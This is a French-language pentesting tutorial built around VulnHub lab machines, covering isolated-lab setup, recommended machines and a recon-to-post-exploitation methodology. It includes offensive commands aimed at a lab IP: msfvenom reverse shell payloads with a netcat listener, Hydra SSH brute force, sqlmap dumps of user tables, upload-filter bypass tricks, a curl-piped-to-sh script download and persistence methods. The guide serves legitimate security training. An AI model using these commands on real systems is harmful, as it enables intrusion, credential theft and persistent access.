# VulnHub - Laboratoire de Pentesting

## 🎯 Vue d'ensemble

**VulnHub** est une plateforme proposant des machines virtuelles vulnérables pour s'entraîner au pentesting. C'est l'une des meilleures ressources gratuites pour développer ses compétences en cybersécurité.

> **💡 Analogie Simple** : VulnHub c'est comme une salle d'arcade de cybersécurité - chaque machine est un jeu différent avec ses propres défis et règles.

## ⚠️ **IMPORTANT - Environnement Sécurisé**

> **🎯 VulnHub est 100% LÉGAL et ÉDUCATIF !**

### 📝 Bonnes Pratiques :

**✅ RECOMMANDÉ :**
```
• Environnement virtualisé isolé
• Réseau NAT ou Host-Only
• Snapshots avant/après tests
• Documentation détaillée des étapes
• Respect des writeups après résolution
```

**❌ À ÉVITER :**
```
• Utilisation sur réseau d'entreprise
• Bridged networking sans précaution
• Tests sur machines non VulnHub
• Partage de solutions avant effort personnel
• Installation sur machine principale
```

## 🎯 Objectifs d'apprentissage

Après cette section, vous saurez :
1. **Setup VulnHub** - Installer et configurer l'environnement
2. **Méthodologie** - Approche structurée du pentesting
3. **Machines recommandées** - Progression par difficulté
4. **Outils essentiels** - Kit de base pour l'exploitation
5. **Documentation** - Rédiger des rapports de qualité

## 🛠️ Configuration de l'Environnement

### **Hyperviseur recommandé**

#### **VMware Workstation/Fusion**
```
AVANTAGES :
• Performance excellente
• Snapshots rapides
• NAT network stable
• Cloning de machines
• Templates personnalisés

CONFIGURATION :
• RAM : 8GB minimum (16GB recommandé)
• CPU : 4 cores minimum
• Stockage : 100GB+ disponible
• NAT network pour isolation
```

#### **VirtualBox (Gratuit)**
```
AVANTAGES :
• Totalement gratuit
• Multi-plateforme
• Grande communauté
• Extensions utiles

CONFIGURATION :
• Extension Pack installé
• Nested virtualization activé
• Host-Only network configuré
• Guest Additions installées
```

### **Machines d'attaque recommandées**

#### **Kali Linux (Standard)**
```bash
# Téléchargement officiel
wget https://kali.download/base-images/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z

# Configuration post-installation
sudo apt update && sudo apt upgrade -y
sudo apt install -y kali-tools-top10
sudo apt install -y gobuster dirb nikto sqlmap

# Configuration réseau
sudo dhclient eth0
ip addr show
```

#### **Parrot Security OS (Alternative)**
```bash
# Plus léger que Kali
# Interface MATE user-friendly
# Outils pré-installés optimisés
# Mieux pour machines avec peu de RAM

# Post-installation
sudo apt update && sudo parrot-upgrade
sudo apt install -y nmap metasploit-framework burpsuite
```

### **Configuration réseau sécurisée**

#### **Réseau NAT isolé**
```
CONFIGURATION VMWARE :
1. Edit → Virtual Network Editor
2. Créer nouveau réseau (ex: VMnet5)
3. Type : NAT
4. Subnet : 192.168.100.0/24
5. DHCP activé

CONFIGURATION VIRTUALBOX :
1. File → Host Network Manager
2. Create new adapter
3. IPv4 Address: 192.168.100.1
4. IPv4 Network Mask: 255.255.255.0
5. DHCP Server activé
```

## 📚 Machines VulnHub par Niveau

### **🟢 Niveau Débutant (1-3/10)**

#### **VulnHub : Mr-Robot**
```
DESCRIPTION :
• Thème série TV Mr Robot
• Multiple vecteurs d'entrée
• Escalade de privilèges progressive
• WordPress vulnerabilities

COMPÉTENCES DÉVELOPPÉES :
• Reconnaissance web
• Exploitation CMS
• Brute force
• Linux privilege escalation

OUTILS NÉCESSAIRES :
• Nmap, Dirb, WPScan
• Burp Suite
• John the Ripper
• LinEnum
```

#### **VulnHub : Basic Pentesting**
```
DESCRIPTION :
• Introduction aux concepts
• Services multiples exposés
• Techniques de base
• Documentation excellente

VECTEURS D'ATTAQUE :
• SMB enumeration
• SSH brute force
• Web application flaws
• Kernel exploits

DURÉE ESTIMÉE : 2-4 heures
```

#### **VulnHub : Kioptrix Level 1**
```
DESCRIPTION :
• Machine classique historique
• Vulnérabilités connues CVE
• Exploitation directe
• Parfait pour débuter

CHALLENGE :
• Samba vulnerabilities
• Apache/OpenSSL exploits
• Basic privilege escalation
• Multiple attack vectors
```

### **🟡 Niveau Intermédiaire (4-6/10)**

#### **VulnHub : DC Series (DC-1 à DC-9)**
```
PROGRESSION RECOMMANDÉE :
DC-1 : Drupal CMS exploitation
DC-2 : WordPress + SSH
DC-3 : Joomla + kernel exploit
DC-4 : Teaming + password cracking
DC-5 : LFI + log poisoning
DC-6 : WordPress + activity monitor
DC-7 : DrupalGeddon2 + backups
DC-8 : SQL injection + exim4
DC-9 : Knockout.js + privilege escalation

COMPÉTENCES PAR MACHINE :
• CMS exploitation avancée
• File inclusion attacks
• SQL injection complex
• Privilege escalation chains
```

#### **VulnHub : PwnLab**
```
DESCRIPTION :
• Multi-étapes complexes
• File upload restrictions
• LFI to RCE
• Advanced privilege escalation

CHALLENGES :
• PHP filter bypass
• File upload exploitation
• Chained vulnerabilities
• MySQL privilege escalation

TECHNIQUES APPRISES :
• PHP wrapper exploitation
• Multi-stage payloads
• Database privilege escalation
• Custom exploit development
```

### **🔴 Niveau Avancé (7-10/10)**

#### **VulnHub : HackLAB: Vulnix**
```
DESCRIPTION :
• Simulation environnement réel
• Multiple services vulnérables
• Network File System exploitation
• Complex privilege escalation

SERVICES EXPOSÉS :
• SSH, NFS, SMTP, HTTP
• User enumeration via finger
• NFS mount vulnerabilities
• Sudo misconfiguration

DURÉE ESTIMÉE : 6-10 heures
```

#### **VulnHub : SickOS Series**
```
SICKOS 1.1 :
• Proxy enumeration
• HTTP PUT method abuse
• Chkrootkit privilege escalation

SICKOS 1.2 :
• Restricted shell escape
• Advanced web exploitation
• Custom payload development

COMPÉTENCES REQUISES :
• Advanced enumeration
• Custom exploit writing
• Complex payload crafting
• Advanced Linux exploitation
```

## 🔧 Méthodologie VulnHub

### **Phase 1 : Reconnaissance**

#### **Découverte de la machine cible**
```bash
# Identifier l'IP de la machine cible
sudo netdiscover -r 192.168.100.0/24
# ou
nmap -sn 192.168.100.0/24

# Résultat typique
192.168.100.1   [VMware adapter]
192.168.100.2   [Gateway/DHCP]
192.168.100.143 [Target machine] ← CIBLE
```

#### **Scan de ports complet**
```bash
# Scan initial rapide
nmap -sS -T4 --top-ports 1000 192.168.100.143

# Scan complet tous ports
nmap -sS -p- -T4 192.168.100.143

# Scan de services détaillé
nmap -sS -sV -sC -p 22,80,139,445 192.168.100.143

# Scan UDP sur ports courants
nmap -sU --top-ports 100 192.168.100.143
```

#### **Énumération web approfondie**
```bash
# Découverte de répertoires
dirb http://192.168.100.143/
gobuster dir -u http://192.168.100.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Scan de vulnérabilités web
nikto -h http://192.168.100.143/

# Détection de technologies
whatweb http://192.168.100.143/
```

### **Phase 2 : Énumération Approfondie**

#### **Services SMB/NetBIOS**
```bash
# Énumération SMB
enum4linux 192.168.100.143
smbclient -L //192.168.100.143/
smbmap -H 192.168.100.143

# Recherche de shares accessibles
smbclient //192.168.100.143/share_name

# Exploitation nullsession
rpcclient -U "" 192.168.100.143
```

#### **Services SSH**
```bash
# Banner grabbing
nmap -sV -p 22 192.168.100.143

# Énumération d'utilisateurs
./ssh-user-enum.py 192.168.100.143

# Test de clés par défaut
hydra -L users.txt -P passwords.txt ssh://192.168.100.143
```

#### **Applications Web CMS**
```bash
# WordPress
wpscan --url http://192.168.100.143/ --enumerate u,p,t,tt

# Drupal
droopescan scan drupal -u http://192.168.100.143/

# Joomla
joomscan -u http://192.168.100.143/
```

### **Phase 3 : Exploitation**

#### **Préparation des payloads**
```bash
# Reverse shell PHP
msfvenom -p php/reverse_php LHOST=192.168.100.130 LPORT=4444 -f raw > shell.php

# Reverse shell Python
msfvenom -p python/shell_reverse_tcp LHOST=192.168.100.130 LPORT=4444 -f raw > shell.py

# Listener Netcat
nc -nlvp 4444
```

#### **Exploitation Web commune**
```bash
# File upload bypass
# Extension double : shell.php.jpg
# Null byte : shell.php%00.jpg
# Case variation : shell.PHP

# SQL Injection avec SQLMap
sqlmap -u "http://192.168.100.143/login.php?id=1" --dbs
sqlmap -u "http://192.168.100.143/login.php?id=1" -D database --tables
sqlmap -u "http://192.168.100.143/login.php?id=1" -D database -T users --dump
```

### **Phase 4 : Post-Exploitation**

#### **Stabilisation du shell**
```bash
# Upgrade du shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# Ou avec script
script /dev/null -c bash
```

#### **Énumération système**
```bash
# Informations système
uname -a
cat /etc/os-release
id
sudo -l

# Recherche SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Processus et services
ps aux
netstat -antup
crontab -l
```

#### **Escalade de privilèges**
```bash
# LinPEAS (automatisé)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Recherche manuelle
• Kernel exploits (uname -a)
• SUID binaries malveillants
• Sudo misconfiguration
• Cron jobs writeable
• Services vulnérables locaux
```

## 📊 Organisation et Documentation

### **Structure de dossiers recommandée**
```
~/VulnHub/
├── machines/
│   ├── mr-robot/
│   │   ├── reconnaissance/
│   │   ├── exploitation/
│   │   ├── post-exploitation/
│   │   ├── screenshots/
│   │   └── notes.md
│   ├── basic-pentesting/
│   └── kioptrix-1/
├── tools/
│   ├── scripts/
│   ├── wordlists/
│   └── exploits/
└── templates/
    ├── report-template.md
    └── checklist.md
```

### **Template de rapport**
```markdown
# VulnHub : [NOM_MACHINE]

## Informations générales
- **Difficulté** : [1-10]
- **Créateur** : [AUTEUR]
- **Date** : [DATE_TENTATIVE]
- **Durée** : [TEMPS_TOTAL]

## Résumé exécutif
[Description courte de l'exploitation]

## Reconnaissance
### Découverte réseau
- IP cible : [IP]
- Ports ouverts : [LISTE_PORTS]

### Énumération des services
[Détails par service]

## Exploitation
### Vecteur d'attaque initial
[Description de l'exploitation]

### Preuve de concept
[Commandes et screenshots]

## Post-exploitation
### Élévation de privilèges
[Méthode utilisée]

### Flags récupérés
- User flag : [FLAG_USER]
- Root flag : [FLAG_ROOT]

## Recommandations
[Points d'amélioration sécuritaire]

## Leçons apprises
[Ce que cette machine a enseigné]
```

## 🎯 Progression Recommandée

### **Semaine 1-2 : Fondamentaux**
```
MACHINES :
• Basic Pentesting 1
• Kioptrix Level 1
• Mr-Robot (facile)

FOCUS :
• Méthodologie de base
• Outils essentiels
• Documentation
```

### **Semaine 3-4 : Consolidation**
```
MACHINES :
• DC-1 (Drupal)
• VulnOS 2
• SickOS 1.1

FOCUS :
• CMS exploitation
• File inclusion
• Privilege escalation patterns
```

### **Mois 2 : Approfondissement**
```
MACHINES :
• PwnLab
• DC Series (2-5)
• Kioptrix 2-3

FOCUS :
• Chained exploits
• Custom payload development
• Advanced enumeration
```

### **Mois 3+ : Expertise**
```
MACHINES :
• SickOS 1.2
• VulnHub challenges avancés
• Machines OSCP-like

FOCUS :
• Zero-day discovery
• Advanced pivoting
• Report writing professional
```

## 🛠️ Outils Indispensables

### **Reconnaissance**
```bash
# Network discovery
nmap, masscan, zmap

# Web enumeration  
dirb, gobuster, dirsearch, ffuf

# Service enumeration
enum4linux, smbmap, snmpwalk
```

### **Exploitation**
```bash
# Web exploitation
burpsuite, sqlmap, nikto

# Metasploit Framework
msfconsole, msfvenom

# Reverse shells
netcat, socat, python
```

### **Post-exploitation**
```bash
# Privilege escalation
linpeas, linenum, pspy

# Persistence
• SSH key injection
• Cron job modification
• Service modification
```

## 📋 Checklist VulnHub

### **Avant de commencer**
```bash
☐ Environnement virtualisé configuré
☐ Réseau isolé activé
☐ Snapshot machine vierge créé
☐ Kali/Parrot à jour
☐ Outils essentiels installés
☐ Structure de dossiers préparée
☐ Template de documentation prêt
☐ Objectifs de la session définis
```

### **Pendant l'exploitation**
```bash
☐ IP cible identifiée
☐ Scan de ports complet
☐ Énumération services détaillée
☐ Screenshots des découvertes importantes
☐ Tentatives d'exploitation documentées
☐ Shell obtenu et stabilisé
☐ Énumération système post-compromission
☐ Escalade de privilèges réussie
☐ Flags récupérés
☐ Persistence installée (optionnel)
```

### **Après exploitation**
```bash
☐ Rapport rédigé complet
☐ Screenshots organisés
☐ Commandes importantes sauvegardées
☐ Vulnérabilités identifiées documentées
☐ Leçons apprises notées
☐ Recommandations formulées
☐ Writeup comparé avec références
☐ Snapshot final créé
```

## 🎯 Ressources et Références

### **Sites VulnHub**
- **VulnHub** : https://www.vulnhub.com/
- **Writeups** : https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
- **OSCP Prep** : https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/

### **Outils essentiels**
- **Kali Linux** : https://www.kali.org/
- **Parrot Security** : https://www.parrotsec.org/
- **SecLists** : https://github.com/danielmiessler/SecLists
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings

### **Documentation**
- **PTES** : http://www.pentest-standard.org/
- **OWASP Testing Guide** : https://owasp.org/www-project-web-security-testing-guide/
- **HackTricks** : https://book.hacktricks.xyz/

---
*VulnHub est le terrain de jeu parfait pour maîtriser le pentesting. Chaque machine vous rend plus fort !* 